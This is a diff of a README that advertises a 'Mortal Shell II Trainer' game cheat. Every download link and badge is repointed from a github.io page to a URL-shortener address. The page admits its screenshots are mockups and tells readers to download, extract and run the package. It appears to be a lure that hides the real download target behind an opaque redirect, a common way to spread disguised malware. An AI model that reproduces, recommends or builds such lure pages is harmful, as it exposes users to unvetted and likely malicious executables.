@@ -10,32 +10,32 @@ The feature set below follows the supplied Mortal Shell II trainer specification
 
 ## Quick Access
 
-[![Mortal Shell II](https://img.shields.io/badge/Mortal%20Shell%20II-Trainer-9d342b?style=for-the-badge)](https://idleobstacle.github.io/)
-[![God Mode](https://img.shields.io/badge/God%20Mode-Protection-b88a45?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Weapon Editor](https://img.shields.io/badge/Weapon-Editor-7b6250?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Map Reveal](https://img.shields.io/badge/Map-Reveal-526b5b?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Configs](https://img.shields.io/badge/Save-Config-5b6168?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-7f2e28?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Mortal Shell II](https://img.shields.io/badge/Mortal%20Shell%20II-Trainer-9d342b?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![God Mode](https://img.shields.io/badge/God%20Mode-Protection-b88a45?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Weapon Editor](https://img.shields.io/badge/Weapon-Editor-7b6250?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Map Reveal](https://img.shields.io/badge/Map-Reveal-526b5b?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Configs](https://img.shields.io/badge/Save-Config-5b6168?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-7f2e28?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download Mortal Shell II Trainer](https://idleobstacle.github.io/)**
+➡️ **[Download Mortal Shell II Trainer](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![Mortal Shell II Trainer](assets/mortal-shell-ii-trainer-preview.png)](https://idleobstacle.github.io/)
+[![Mortal Shell II Trainer](assets/mortal-shell-ii-trainer-preview.png)](https://flyn.co/17yeN7/)
 
 ### Feature Overview
 
-[![Mortal Shell II Trainer Features](assets/mortal-shell-ii-trainer-features.png)](https://idleobstacle.github.io/)
+[![Mortal Shell II Trainer Features](assets/mortal-shell-ii-trainer-features.png)](https://flyn.co/17yeN7/)
 
 ### Weapon Editor
 
-[![Mortal Shell II Weapon Editor](assets/mortal-shell-ii-weapon-editor.png)](https://idleobstacle.github.io/)
+[![Mortal Shell II Weapon Editor](assets/mortal-shell-ii-weapon-editor.png)](https://flyn.co/17yeN7/)
 
 > Interface images are project mockups intended to illustrate the trainer layout.
 
@@ -218,7 +218,7 @@ Game Speed:        1.0x
 
 1. Download the current trainer package:
 
-   **[Download Mortal Shell II Trainer](https://idleobstacle.github.io/)**
+   **[Download Mortal Shell II Trainer](https://flyn.co/17yeN7/)**
 
 2. Extract the package into a dedicated folder.
 3. Start **Mortal Shell II**.
